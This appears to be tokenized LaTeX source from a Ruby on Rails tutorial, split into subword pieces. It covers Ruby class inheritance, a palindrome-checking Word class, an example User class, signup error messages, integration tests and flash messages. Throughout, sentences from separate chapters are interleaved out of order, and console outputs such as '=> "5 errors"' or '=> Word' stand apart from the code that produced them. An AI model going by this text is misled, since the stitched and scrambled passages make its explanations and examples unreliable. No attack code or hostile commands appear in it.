▁It ' s ▁worth ▁noting ▁that ▁this ▁error - messages ▁partial ▁is ▁only ▁a ▁first ▁attempt ; ▁the ▁final ▁version ▁appears ▁in ▁Section ~\ ref { sec : creating _ microposts }.
▁Code ▁to ▁display ▁error ▁messages ▁on ▁the ▁signup ▁form .
▁A ▁diagram ▁of ▁this ▁inheritance ▁hierarchy ▁appears ▁in ▁F igure ~\ ref { fig : string _ inheritance _ ruby _ 1 _ 9 }.
▁We ▁see ▁here ▁that ▁the ▁ super class ▁of ▁\ k ode { String } ▁is ▁\ k ode { Object } ▁and ▁the ▁ super class ▁of ▁\ k ode { Object } ▁is ▁\ k ode { B as ic Object }, ▁but ▁\ k ode { B as ic Object } ▁has ▁no ▁ super class .
▁This ▁pattern ▁is ▁true ▁of ▁every ▁Ruby ▁object : ▁trace ▁back ▁the ▁class ▁hierarchy ▁far ▁enough ▁and ▁every ▁class ▁in ▁Ruby ▁ ultimate ly ▁inherit s ▁from ▁\ k ode { B as ic Object }, ▁which ▁has ▁no ▁ super class ▁itself .
▁This ▁is ▁the ▁technical ▁meaning ▁of ▁`` e verything ▁in ▁Ruby ▁is ▁an ▁object ''.
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁\ k ode { String } ▁class .
▁Noti ce ▁here ▁that ▁we ▁\ k ode { render } ▁a ▁partial ▁called ▁\ k ode { ' shared / error \_ messages ' } ; ▁this ▁reflect s ▁the ▁common ▁Rails ▁convention ▁of ▁using ▁a ▁d ed icated ▁\ k ode { shared / } ▁directory ▁for ▁partials ▁expected ▁to ▁be ▁used ▁in ▁views ▁across ▁multiple ▁controllers .
▁To ▁understand ▁classes ▁a ▁little ▁more ▁ deep ly , ▁there ' s ▁no ▁sub st it ute ▁for ▁making ▁one ▁of ▁our ▁own .
▁( We ' ll ▁see ▁this ▁expect ation ▁ ful filled ▁in ▁Section ~\ ref { sec : edit _ form }. )
▁Let ' s ▁make ▁a ▁\ k ode { Word } ▁class ▁with ▁a ▁\ k ode { palindrome ?}\ ▁method ▁that ▁returns ▁\ k ode { true } ▁if ▁the ▁word ▁is ▁the ▁same ▁sp e ll ed ▁forward ▁and ▁back w ar d :
▁This ▁means ▁that ▁we ▁have ▁to ▁create ▁a ▁new ▁\ k ode { app / views / shared } ▁directory ▁using ▁\ k ode { mkdir } ▁( Table ~\ ref { table : un i x _ command s }) :
▁The ▁contents ▁of ▁the ▁partial ▁appear ▁in ▁Listing ~\ ref { code : errors _ partial }.
▁We ▁can ▁use ▁it ▁as ▁follows :
▁A ▁partial ▁for ▁display ing ▁form ▁submission ▁error ▁messages .
▁=> ▁#< Word : 0 x 22 d 0 b 20 >
▁If ▁this ▁example ▁ str ike s ▁you ▁as ▁a ▁bit ▁con tr ive d , ▁good --- this ▁is ▁by ▁design .
▁This ▁partial ▁introduce s ▁sever al ▁new ▁Rails ▁and ▁Ruby ▁construct s , ▁including ▁two ▁methods ▁for ▁Rails ▁error ▁objects .
▁It ' s ▁odd ▁to ▁create ▁a ▁new ▁class ▁just ▁to ▁create ▁a ▁method ▁that ▁take s ▁a ▁string ▁as ▁an ▁argument .
▁The ▁first ▁method ▁is ▁\ k ode { count }, ▁which ▁simply ▁returns ▁the ▁number ▁of ▁errors :
▁S ince ▁a ▁word ▁\ emph { is ▁a } ▁string , ▁it ' s ▁more ▁natural ▁to ▁have ▁our ▁\ k ode { Word } ▁class ▁\ emph { inherit } ▁from ▁\ k ode { String }, ▁as ▁seen ▁in ▁Listing ~\ ref { code : word _ class }.
▁The ▁other ▁new ▁method ▁is ▁\ k ode { any ? }, ▁which ▁( together ▁with ▁\ k ode { empty ? }) ▁is ▁one ▁of ▁a ▁pair ▁of ▁complement ary ▁methods :
▁( You ▁should ▁exit ▁the ▁console ▁and ▁re - ent er ▁it ▁to ▁clear ▁out ▁the ▁old ▁definition ▁of ▁\ k ode { Word }. )
▁Defin ing ▁a ▁\ k ode { Word } ▁class ▁in ▁the ▁console .
▁We ▁see ▁here ▁that ▁the ▁\ k ode { empty ?}\ ▁method , ▁which ▁we ▁first ▁saw ▁in ▁Section ~\ ref { sec : objects _ and _ message _ passing } ▁in ▁the ▁context ▁of ▁strings , ▁also ▁works ▁on ▁Rails ▁error ▁objects , ▁return ing ▁\ k ode { true } ▁for ▁an ▁empty ▁object ▁and ▁\ k ode { false } ▁otherwise .
▁The ▁\ k ode { any ?}\ ▁method ▁is ▁just ▁the ▁oppos ite ▁of ▁\ k ode { empty ? }, ▁return ing ▁\ k ode { true } ▁if ▁there ▁are ▁any ▁elements ▁present ▁and ▁\ k ode { false } ▁otherwise .
▁( B y ▁the ▁way , ▁all ▁of ▁these ▁methods --- \ k ode { count }, ▁\ k ode { empty ? }, ▁and ▁\ k ode { any ? }--- work ▁on ▁Ruby ▁arrays ▁as ▁well .
▁Here ▁\ k ode { Word ▁< ▁ String } ▁is ▁the ▁Ruby ▁syntax ▁for ▁inheritance ▁( discusse d ▁brief ly ▁in ▁Section ~\ ref { sec : static _ pages }), ▁which ▁ensure s ▁that , ▁in ▁addition ▁to ▁the ▁new ▁\ k ode { palindrome ?}\ ▁method , ▁words ▁also ▁have ▁all ▁the ▁same ▁methods ▁as ▁strings :
▁We ' ll ▁put ▁this ▁fact ▁to ▁good ▁use ▁starting ▁in ▁Section ~\ ref { sec : showing _ microposts }. )
▁The ▁other ▁new ▁idea ▁is ▁the ▁\ k ode { pluralize } ▁text ▁helper .
▁=> ▁" level "
▁=> ▁" 1 ▁error "
▁# ▁ Word s ▁have ▁the ▁ palindrome ?
▁=> ▁" 5 ▁errors "
▁We ▁see ▁here ▁that ▁\ k ode { pluralize } ▁take s ▁an ▁integer ▁argument ▁and ▁the n ▁returns ▁the ▁number ▁with ▁a ▁properly ▁ pluralize d ▁version ▁of ▁its ▁second ▁argument .
▁Under ly ing ▁this ▁method ▁is ▁a ▁powerful ▁\ emph { inflect or } ▁that ▁know s ▁how ▁to ▁ pluralize ▁a ▁large ▁number ▁of ▁words , ▁including ▁many ▁with ▁ ir r egular ▁plural s :
▁S ince ▁the ▁\ k ode { Word } ▁class ▁inherit s ▁from ▁\ k ode { String }, ▁we ▁can ▁use ▁the ▁console ▁to ▁see ▁the ▁class ▁hierarchy ▁explicitly :
▁=> ▁" 2 ▁ w o me n "
▁=> ▁ Word
▁=> ▁" 3 ▁ er r at a "
▁As ▁a ▁result ▁of ▁its ▁use ▁of ▁\ k ode { pluralize }, ▁the ▁code
▁returns ▁\ k ode {" 0 ▁errors " }, ▁\ k ode {" 1 ▁error " }, ▁\ k ode {" 2 ▁errors " }, ▁and ▁so ▁on , ▁depending ▁on ▁how ▁many ▁errors ▁there ▁are , ▁there by ▁avoid ing ▁ungrammatical ▁ ph ra s es ▁such ▁as ▁\ k ode {" 1 ▁errors "} ▁( a ▁d ist re s s ing ly ▁common ▁mistake ▁in ▁app s ▁and ▁on ▁the ▁Web ).
▁This ▁hierarchy ▁is ▁illustrate d ▁in ▁F igure ~\ ref { fig : word _ inheritance _ ruby _ 1 _ 9 }.
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁( n on - built - in ) ▁\ k ode { Word } ▁class ▁from ▁Listing ~\ ref { code : word _ class }.
▁In ▁addition , ▁after ▁an ▁invalid ▁submission ▁Rails ▁automatically ▁wrap s ▁the ▁fields ▁with ▁errors ▁in ▁\ k ode { div } s ▁with ▁the ▁CSS ▁class ▁\ k ode { field \_ with \_ errors }.
▁In ▁Listing ~\ ref { code : word _ class }, ▁note ▁that ▁check ing ▁that ▁the ▁word ▁is ▁its ▁own ▁reverse ▁involve s ▁access ing ▁the ▁word ▁inside ▁the ▁\ k ode { Word } ▁class .
▁These ▁ label s ▁the n ▁allow ▁us ▁to ▁style ▁the ▁error ▁messages ▁with ▁the ▁SCSS ▁show n ▁in ▁Listing ~\ ref { code : error _ messages _ css }, ▁which ▁make s ▁use ▁of ▁Sass ' s ▁\ k ode {@ ext end } ▁function ▁to ▁include ▁the ▁functionality ▁of ▁the ▁Bootstrap ▁class ▁\ k ode { has - error }.
▁Ruby ▁allows ▁us ▁to ▁do ▁this ▁using ▁the ▁\ k ode { self } ▁keyword : ▁inside ▁the ▁\ k ode { Word } ▁class , ▁\ k ode { self } ▁is ▁the ▁object ▁itself , ▁which ▁means ▁we ▁can ▁use
▁CSS ▁for ▁styling ▁error ▁messages .
▁to ▁check ▁if ▁the ▁word ▁is ▁a ▁ palindrome
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : f _ error _ messages } ▁and ▁Listing ~\ ref { code : errors _ partial } ▁and ▁the ▁SCSS ▁from ▁Listing ~\ ref { code : error _ messages _ css }, ▁helpful ▁error ▁messages ▁now ▁appear ▁when ▁ submitting ▁invalid ▁signup ▁information , ▁as ▁seen ▁in ▁F igure ~\ ref { fig : signup _ error _ messages }.
▁For ▁more ▁on ▁Ruby ▁classes ▁and ▁the ▁\ k ode { self } ▁keyword , ▁see ▁the ▁\ href { http :// rails t ips . org /}{ Rails T ips } ▁post ▁`` \ href { http :// rails t ips . org / blog / archive s / 200 6 / 11 / 18 / class - and - instance - variable s - in - ruby /}{ Class ▁and ▁In st ance ▁ V ar i able s ▁in ▁Ruby } ''.
▁Because ▁the ▁messages ▁are ▁generated ▁by ▁the ▁model ▁validations , ▁they ▁will ▁automatically ▁change ▁if ▁you ▁ever ▁change ▁your ▁mind ▁about , ▁say , ▁the ▁format ▁of ▁email ▁addresses , ▁or ▁the ▁minimum ▁length ▁of ▁passwords .
▁In ▁fact , ▁inside ▁the ▁ String ▁class ▁the ▁use ▁of ▁\ k ode { self . } \ ▁is ▁optional ▁on ▁a ▁method ▁or ▁attribute ▁( unless ▁we ' re ▁making ▁an ▁assignment ), ▁so
▁would ▁work ▁as ▁well .
▁Whi le ▁inheritance ▁is ▁a ▁powerful ▁idea , ▁in ▁the ▁case ▁of ▁ palindrome s ▁it ▁m ight ▁be ▁even ▁more ▁natural ▁to ▁add ▁the ▁\ k ode { palindrome ?}\ ▁method ▁to ▁the ▁\ k ode { String } ▁class ▁itself , ▁so ▁that ▁( a mong ▁other ▁things ) ▁we ▁can ▁call ▁\ k ode { palindrome ?}\ ▁on ▁a ▁string ▁literal , ▁which ▁we ▁current ly ▁can ' t ▁do :
▁F a il ed ▁signup ▁with ▁error ▁messages .
▁ NoMethodError : ▁undefined ▁method ▁` palindrome ? '
▁In ▁the ▁days ▁before ▁powerful ▁web ▁frameworks ▁with ▁full ▁testing ▁capabilities , ▁developers ▁ha d ▁to ▁test ▁forms ▁by ▁hand .
▁for ▁" level " : String
▁For ▁example , ▁to ▁test ▁a ▁signup ▁page ▁manually , ▁we ▁would ▁have ▁to ▁visit ▁the ▁page ▁in ▁a ▁browser ▁and ▁the n ▁submit ▁alternate ly ▁invalid ▁and ▁valid ▁data , ▁verify ing ▁in ▁each ▁case ▁that ▁the ▁application ' s ▁behavior ▁was ▁correct .
▁A ma z ing ly , ▁Ruby ▁let s ▁you ▁do ▁just ▁this ; ▁Ruby ▁classes ▁can ▁be ▁\ emph { open ed } ▁and ▁modified , ▁allow ing ▁ordinar y ▁m or t al s ▁such ▁as ▁our s el ve s ▁to ▁add ▁methods ▁to ▁them
▁More over , ▁we ▁would ▁have ▁to ▁remember ▁to ▁ r epeat ▁the ▁process ▁any ▁time ▁the ▁application ▁changed .
▁This ▁process ▁was ▁p a in ful ▁and ▁error - prone .
▁H appily , ▁with ▁Rails ▁we ▁can ▁write ▁tests ▁to ▁automate ▁the ▁testing ▁of ▁forms .
▁In ▁this ▁section , ▁we ' ll ▁write ▁one ▁such ▁test ▁to ▁verify ▁the ▁correct ▁behavior ▁upon ▁invalid ▁form ▁submission ; ▁in ▁Section ~\ ref { sec : a _ test _ for _ valid _ submission }, ▁we ' ll ▁write ▁a ▁corresponding ▁test ▁for ▁valid ▁submission .
▁To ▁get ▁started , ▁we ▁first ▁generate ▁an ▁integration ▁test ▁file ▁for ▁sign ing ▁up ▁users , ▁which ▁we ' ll ▁call ▁\ k ode { users \_ signup } ▁( a do p ting ▁the ▁controller ▁convention ▁of ▁a ▁plural ▁resource ▁name ) :
▁( I ▁don ' t ▁know ▁which ▁is ▁co ol er : ▁that ▁Ruby ▁let s ▁you ▁add ▁methods ▁to ▁built - in ▁classes , ▁or ▁that ▁\ k ode {" de if i ed "} ▁is ▁a ▁ palindrome .)
▁Mo d ify ing ▁built - in ▁classes ▁is ▁a ▁powerful ▁technique , ▁but ▁with ▁great ▁power ▁comes ▁great ▁responsib il ity , ▁and ▁it ' s ▁consider ed ▁ bad ▁form ▁to ▁add ▁methods ▁to ▁built - in ▁classes ▁without ▁ having ▁a ▁\ emph { re ally } ▁good ▁reason ▁for ▁doing ▁so .
▁Rails ▁does ▁have ▁some ▁good ▁reason s ; ▁for ▁example , ▁in ▁web ▁applications ▁we ▁often ▁want ▁to ▁prevent ▁variables ▁from ▁being ▁\ emph { blank }--- e . g . , ▁a ▁user ' s ▁name ▁should ▁be ▁something ▁other ▁than ▁spaces ▁and ▁other ▁\ href { http :// en . wiki p edia . org / wiki / W h ite space _ ( computer _ science )} { white space }--- so ▁Rails ▁add s ▁a ▁\ k ode { blank ?}\ ▁method ▁to ▁Ruby .
▁( We ' ll ▁use ▁this ▁same ▁file ▁in ▁Section ~\ ref { sec : a _ test _ for _ valid _ submission } ▁to ▁test ▁a ▁valid ▁signup .)
▁S ince ▁the ▁Rails ▁console ▁automatically ▁includes ▁the ▁Rails ▁extensions , ▁we ▁can ▁see ▁an ▁example ▁here ▁( this ▁won ' t ▁work ▁in ▁plain ▁\ k ode { i rb }) :
▁The ▁main ▁purpose ▁of ▁our ▁test ▁is ▁to ▁verify ▁that ▁click ing ▁the ▁signup ▁button ▁results ▁in ▁\ emph { not } ▁creating ▁a ▁new ▁user ▁when ▁the ▁submitted ▁information ▁is ▁invalid .
▁( Writ ing ▁a ▁test ▁for ▁the ▁error ▁messages ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : signup _ exercises }).)
▁The ▁way ▁to ▁do ▁this ▁is ▁to ▁check ▁the ▁\ emph { count } ▁of ▁users , ▁and ▁under ▁the ▁hood ▁our ▁tests ▁will ▁use ▁the ▁\ k ode { count } ▁method ▁available ▁on ▁every ▁Active ▁Record ▁class , ▁including ▁\ k ode { User } :
▁Here ▁\ k ode { User . count } ▁is ▁\ k ode { 0 } ▁because ▁we ▁reset ▁the ▁database ▁at ▁the ▁beginning ▁of ▁Section ~\ ref { sec : signup _ form }.
▁We ▁see ▁that ▁a ▁string ▁of ▁spaces ▁is ▁not ▁\ emph { empty }, ▁but ▁it ▁is ▁\ emph { blank }.
▁As ▁in ▁Section ~\ ref { sec : layout _ link _ tests }, ▁we ' ll ▁use ▁\ k ode { assert \_ select } ▁to ▁test ▁HTML ▁elements ▁of ▁the ▁relevant ▁pages , ▁tak ing ▁care ▁to ▁check ▁only ▁elements ▁unlike ly ▁to ▁change ▁in ▁the ▁future .
▁Note ▁also ▁that ▁\ k ode { nil } ▁is ▁blank ; ▁since ▁\ k ode { nil } ▁is n ' t ▁a ▁string , ▁this ▁is ▁a ▁hint ▁that ▁Rails ▁actually ▁add s ▁\ k ode { blank ?}\ ▁to ▁\ k ode { String } ' s ▁base ▁class , ▁which ▁( as ▁we ▁saw ▁at ▁the ▁beginning ▁of ▁this ▁section ) ▁is ▁\ k ode { Object } ▁itself .
▁We ' ll ▁start ▁by ▁visit ing ▁the ▁signup ▁path ▁using ▁\ k ode { get } :
▁We ' ll ▁see ▁some ▁other ▁examples ▁of ▁Rails ▁addition s ▁to ▁Ruby ▁classes ▁in ▁Section ~\ ref { sec : remember _ me }.
▁In ▁order ▁to ▁test ▁the ▁form ▁submission , ▁we ▁need ▁to ▁issue ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { users \_ path } ▁( Table ~\ ref { table : RESTful _ users }), ▁which ▁we ▁can ▁do ▁with ▁the ▁\ k ode { post } ▁function :
▁All ▁this ▁t al k ▁about ▁classes ▁and ▁inheritance ▁may ▁have ▁trigger ed ▁a ▁flash ▁of ▁re co g n it ion , ▁because ▁we ▁have ▁seen ▁both ▁before , ▁in ▁the ▁Static ▁Pages ▁controller ▁( Listing ~\ ref { code : adding _ the _ about _ page }) :
▁Here ▁we ' ve ▁included ▁the ▁\ k ode { params [: user ]} ▁hash ▁expected ▁by ▁\ k ode { User . new } ▁in ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : signup _ flash }).
▁This ▁is ▁equivalent ▁to ▁record ing ▁the ▁user ▁count , ▁post ing ▁the ▁data , ▁and ▁verify ing ▁that ▁the ▁count ▁is ▁the ▁same :
▁A lthough ▁the ▁two ▁are ▁equivalent , ▁using ▁\ k ode { assert \_ no \_ difference } ▁is ▁clean er ▁and ▁is ▁more ▁idiomatic ally ▁correct ▁Ruby .
▁S ince ▁each ▁Rails ▁console ▁session ▁load s ▁the ▁local ▁Rails ▁environment , ▁we ▁can ▁even ▁create ▁a ▁controller ▁explicitly ▁and ▁examine ▁its ▁class ▁hierarchy
▁It ' s ▁worth ▁noting ▁that ▁the ▁\ k ode { get } ▁and ▁\ k ode { post } ▁steps ▁above ▁are ▁technical ly ▁un rel at ed , ▁and ▁it ' s ▁actually ▁not ▁necessary ▁to ▁get ▁the ▁signup ▁path ▁before ▁post ing ▁to ▁the ▁users ▁path .
▁You ▁don ' t ▁have ▁to ▁know ▁what ▁each ▁class ▁in ▁this ▁hierarchy ▁does .
▁I ▁prefer ▁to ▁include ▁both ▁steps , ▁though , ▁both ▁for ▁ concept u al ▁cl ar ity ▁and ▁to ▁double - check ▁that ▁the ▁signup ▁form ▁render s ▁without ▁error .
▁\ emph { I } ▁don ' t ▁know ▁what ▁they ▁all ▁do , ▁and ▁I ' ve ▁been ▁programming ▁in ▁Ruby ▁on ▁Rails ▁since ▁200 5 .
▁P utting ▁the ▁above ▁idea s ▁together ▁lead s ▁to ▁the ▁test ▁in ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission }.
▁This ▁means ▁either ▁that ▁( a ) ▁I ' m ▁g ross ly ▁in com p et ent ▁or ▁( b ) ▁you ▁can ▁be ▁a ▁ s k i ll ed ▁Rails ▁developer ▁without ▁know ing ▁all ▁its ▁in n ar d s .
▁We ' ve ▁also ▁included ▁a ▁call ▁to ▁\ k ode { assert \_ template } ▁to ▁check ▁that ▁a ▁failed ▁submission ▁re - render s ▁the ▁\ k ode { new } ▁action .
▁I ▁hope ▁for ▁both ▁our ▁ s a k es ▁that ▁it ' s ▁the ▁latter .
▁ Adding ▁lines ▁to ▁check ▁for ▁the ▁appearance ▁of ▁error ▁messages ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : signup _ exercises }).
▁=> ▁#< StaticPages Controller : 0 x 2 28 5 5 d 0 >
▁A ▁test ▁for ▁an ▁invalid ▁signup .
▁=> ▁StaticPages Controller
▁=> ▁Application Controller
▁Because ▁we ▁wrote ▁the ▁application ▁code ▁before ▁the ▁integration ▁test , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁=> ▁ ActionController :: Base
▁=> ▁ ActionController :: M et al
▁=> ▁ Abstract Controller :: Base
▁Having ▁handle d ▁invalid ▁form ▁submission s , ▁now ▁it ' s ▁time ▁to ▁complete ▁the ▁signup ▁form ▁by ▁actually ▁saving ▁a ▁new ▁user ▁( if ▁valid ) ▁to ▁the ▁database .
▁First , ▁we ▁try ▁to ▁save ▁the ▁user ; ▁if ▁the ▁save ▁succeed s , ▁the ▁user ' s ▁information ▁get s ▁written ▁to ▁the ▁database ▁automatically , ▁and ▁we ▁the n ▁\ emph { redirect } ▁the ▁browser ▁to ▁show ▁the ▁user ' s ▁profile ▁( together ▁with ▁a ▁ friendly ▁ greeting ), ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : signup _ success _ mockup }.
▁A ▁diagram ▁of ▁this ▁hierarchy ▁appears ▁in ▁F igure ~\ ref { fig : static _ pages _ controller _ inheritance }.
▁If ▁it ▁fails , ▁we ▁simply ▁f all ▁back ▁on ▁the ▁behavior ▁ developed ▁in ▁Section ~\ ref { sec : unsuccessful _ signup s }.
▁A ▁mockup ▁of ▁successful ▁signup .
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁Static ▁Pages .
▁\ label { fig : signup _ success _ mockup } }< n >\ end { figure }< n >< n > ▁\ subsection { The ▁finished ▁signup ▁form } ▁% ▁( fold )< n > ▁\ label { sec : the _ f in is h ed _ signup _ form }< n >< n >
▁To ▁complete ▁a ▁working ▁signup ▁form , ▁we ▁need ▁to ▁fill ▁in ▁the ▁comment ed - out ▁section ▁in ▁Listing ~\ ref { code : create _ action _ strong _ parameters } ▁with ▁the ▁appropriate ▁behavior .
▁Currently , ▁the ▁form ▁fails ▁on ▁valid ▁submission .
▁We ▁can ▁even ▁call ▁the ▁controller ▁actions ▁inside ▁the ▁console , ▁which ▁are ▁just ▁methods :
▁As ▁indicate d ▁in ▁F igure ~\ ref { fig : valid _ submission _ error }, ▁this ▁is ▁because ▁the ▁default ▁behavior ▁for ▁a ▁Rails ▁action ▁is ▁to ▁render ▁the ▁corresponding ▁view , ▁and ▁there ▁is n ' t ▁a ▁view ▁template ▁corresponding ▁to ▁the ▁\ k ode { create } ▁action .
▁The ▁error ▁page ▁for ▁a ▁valid ▁signup ▁submission .
▁Here ▁the ▁return ▁value ▁is ▁\ k ode { nil } ▁because ▁the ▁\ k ode { home } ▁action ▁is ▁blank .
▁But ▁wait --- action s ▁don ' t ▁have ▁return ▁values , ▁at ▁least ▁not ▁one s ▁that ▁matter .
▁R ather ▁than ▁render ▁a ▁page ▁on ▁successful ▁user ▁creation , ▁we ' ll ▁instead ▁\ emph { redirect } ▁to ▁a ▁different ▁page .
▁The ▁point ▁of ▁the ▁\ k ode { home } ▁action , ▁as ▁we ▁saw ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁is ▁to ▁render ▁a ▁web ▁page , ▁not ▁to ▁return ▁a ▁value .
▁And ▁I ▁sure ▁don ' t ▁remember ▁ever ▁calling ▁\ k ode { StaticPages Controller . new } ▁any where .
▁We ' ll ▁follow ▁the ▁common ▁convention ▁of ▁redirect ing ▁to ▁the ▁new ly ▁created ▁user ' s ▁profile , ▁although ▁the ▁root ▁path ▁would ▁also ▁work .
▁What ' s ▁going ▁on ?
▁What ' s ▁going ▁on ▁is ▁that ▁Rails ▁is ▁\ emph { written ▁in } ▁Ruby , ▁but ▁Rails ▁is n ' t ▁Ruby .
▁The ▁application ▁code , ▁which ▁introduce s ▁the ▁\ k ode { redirect \_ to } ▁method , ▁appears ▁in ▁Listing ~\ ref { code : user _ create _ action }.
▁Some ▁Rails ▁classes ▁are ▁used ▁like ▁ordinar y ▁Ruby ▁objects , ▁but ▁some ▁are ▁just ▁\ href { http :// www . an s w ers . com / gr ist }{ gr ist } ▁for ▁Rails ' ▁magic ▁m i ll .
▁The ▁user ▁\ k ode { create } ▁action ▁with ▁a ▁save ▁and ▁a ▁redirect .
▁Rails ▁is ▁\ href { http :// en . wiki p edia . org / wiki / S u i _ ge n er is }{\ emph { s u i ▁g en er is } }, ▁and ▁should ▁be ▁stud i ed ▁and ▁under st ood ▁separate ly ▁from ▁Ruby .
▁We ▁end ▁our ▁to ur ▁of ▁Ruby ▁with ▁a ▁complete ▁class ▁of ▁our ▁own , ▁a ▁\ k ode { User } ▁class ▁that ▁an tic ip ate s ▁the ▁User ▁model ▁com ing ▁up ▁in ▁Chapter ~\ ref { cha : modeling _ users }.
▁So ▁far ▁we ' ve ▁entered ▁class ▁definition s ▁at ▁the ▁console , ▁but ▁this ▁quickly ▁becomes ▁ti re some ; ▁instead , ▁create ▁the ▁file ▁\ k ode { example \_ user . rb } ▁in ▁your ▁application ▁root ▁directory ▁and ▁fill ▁it ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : example _ user }.
▁Code ▁for ▁an ▁example ▁user .
▁Note ▁that ▁we ' ve ▁written
▁where ▁we ▁could ▁have ▁used ▁the ▁equivalent
▁There ' s ▁quite ▁a ▁bit ▁going ▁on ▁here , ▁so ▁let ' s ▁take ▁it ▁step ▁by ▁step .
▁The ▁first ▁line ,
▁This ▁is ▁because ▁Rails ▁automatically ▁infer s ▁from ▁\ k ode { redirect \_ to ▁@ user } ▁that ▁we ▁want ▁to ▁redirect ▁to ▁\ k ode { user \_ url (@ user ) }.
▁creates ▁\ emph { attribute ▁ accessor s } ▁corresponding ▁to ▁a ▁user ' s ▁name ▁and ▁email ▁address .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : user _ create _ action }, ▁our ▁signup ▁form ▁is ▁actually ▁working , ▁but ▁before ▁ submitting ▁a ▁valid ▁re g ist r ation ▁in ▁a ▁browser ▁we ' re ▁going ▁to ▁add ▁a ▁bit ▁of ▁polish ▁common ▁in ▁web ▁applications : ▁a ▁message ▁that ▁appears ▁on ▁the ▁subsequent ▁page ▁( in ▁this ▁case , ▁we l com ing ▁our ▁new ▁user ▁to ▁the ▁application ) ▁and ▁the n ▁disappear s ▁upon ▁visit ing ▁a ▁second ▁page ▁or ▁on ▁page ▁reload .
▁This ▁creates ▁`` get ter '' ▁and ▁`` set ter '' ▁methods ▁that ▁allow ▁us ▁to ▁retrieve ▁( get ) ▁and ▁assign ▁( set ) ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁\ emph { instance ▁variables }, ▁which ▁were ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : mvc _ in _ action } ▁and ▁Section ~\ ref { sec : static _ pages _ exercises }.
▁The ▁Rails ▁way ▁to ▁display ▁a ▁temporary ▁message ▁is ▁to ▁use ▁a ▁special ▁method ▁called ▁the ▁\ emph { flash }, ▁which ▁we ▁can ▁treat ▁like ▁a ▁hash .
▁In ▁Rails , ▁the ▁principal ▁ import ance ▁of ▁instance ▁variables ▁is ▁that ▁they ▁are ▁automatically ▁available ▁in ▁the ▁views , ▁but ▁in ▁general ▁they ▁are ▁used ▁for ▁variables ▁that ▁need ▁to ▁be ▁available ▁throughout ▁a ▁Ruby ▁class .
▁Rails ▁a do p t s ▁the ▁convention ▁of ▁a ▁\ k ode { : success } ▁key ▁for ▁a ▁message ▁indicat ing ▁a ▁successful ▁result ▁( Listing ~\ ref { code : signup _ flash }).
▁( We ' ll ▁have ▁more ▁to ▁say ▁about ▁this ▁in ▁a ▁moment .)
▁ Adding ▁a ▁flash ▁message ▁to ▁user ▁signup .
▁In st ance ▁variables ▁always ▁begin ▁with ▁an ~\ k ode {@ } ▁sign , ▁and ▁are ▁\ k ode { nil } ▁when ▁undefined .
▁The ▁first ▁method , ▁\ k ode { initialize }, ▁is ▁special ▁in ▁Ruby : ▁it ' s ▁the ▁method ▁called ▁when ▁we ▁execute ▁\ k ode { User . new }.
▁This ▁particular ▁\ k ode { initialize } ▁take s ▁one ▁argument , ▁\ k ode { attributes } :
▁By ▁assign ing ▁a ▁message ▁to ▁the ▁\ k ode { flash }, ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁display ▁the ▁message ▁on ▁the ▁first ▁page ▁after ▁the ▁redirect .
▁Ou r ▁method ▁is ▁to ▁iterate ▁through ▁the ▁\ k ode { flash } ▁and ▁insert ▁all ▁relevant ▁messages ▁into ▁the ▁site ▁layout .
▁You ▁may ▁recall ▁the ▁console ▁example ▁in ▁Section ~\ ref { sec : hashes _ and _ symbol s }, ▁where ▁we ▁saw ▁how ▁to ▁iterate ▁through ▁a ▁hash ▁using ▁the ▁ str ate g ical ly ▁named ▁\ k ode { flash } ▁variable :
▁F inally , ▁our ▁class ▁defines ▁a ▁method ▁called ▁\ k ode { formatted \_ email } ▁that ▁uses ▁the ▁values ▁of ▁the ▁assign ed ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁variables ▁to ▁build ▁up ▁a ▁nicely ▁ formatted ▁version ▁of ▁the ▁user ' s ▁email ▁address ▁using ▁string ▁interpolation ▁( Section ~\ ref { sec : string s }) :
▁" It ▁work ed !"
▁Because ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁are ▁both ▁instance ▁variables ▁( as ▁indicate d ▁with ▁the ~\ k ode {@ } ▁sign ), ▁they ▁are ▁automatically ▁available ▁in ▁the ▁\ k ode { formatted \_ email } ▁method .
▁It ▁failed .
▁Let ' s ▁fire ▁up ▁the ▁console , ▁\ k ode { require } ▁the ▁example ▁user ▁code , ▁and ▁take ▁our ▁User ▁class ▁out ▁for ▁a ▁sp in :
▁ success
▁=> ▁#< User : 0 x 22 4 ce ec ▁@ email = nil , ▁@ name = nil >
▁It ▁work ed !
▁=> ▁" Ex ample ▁User "
▁By ▁following ▁this ▁pattern , ▁we ▁can ▁arrange ▁to ▁display ▁the ▁contents ▁of ▁the ▁flash ▁site - wide ▁using ▁code ▁like ▁this :
▁( This ▁code ▁is ▁a ▁particular ly ▁ugly ▁combination ▁of ▁HTML ▁and ▁ERb ; ▁making ▁it ▁pre tt i er ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : signup _ exercises }).)
▁=> ▁" user @ example . com "
▁Here ▁the ▁ embedded ▁Ruby
▁=> ▁" Ex ample ▁User ▁< user @ example . com > "
▁( The ▁key ▁\ k ode { : success } ▁is ▁a ▁symbol , ▁but ▁ embedded ▁Ruby ▁automatically ▁convert s ▁it ▁to ▁the ▁string ▁\ k ode {" success "} ▁before ▁insert ing ▁it ▁into ▁the ▁template .)
▁Here ▁the ▁\ k ode { ' . ' } ▁is ▁Unix ▁for ▁`` current ▁directory '' , ▁and ▁\ k ode { ' . / example \_ user ' } ▁tell s ▁Ruby ▁to ▁look ▁for ▁an ▁example ▁user ▁file ▁relative ▁to ▁that ▁location .
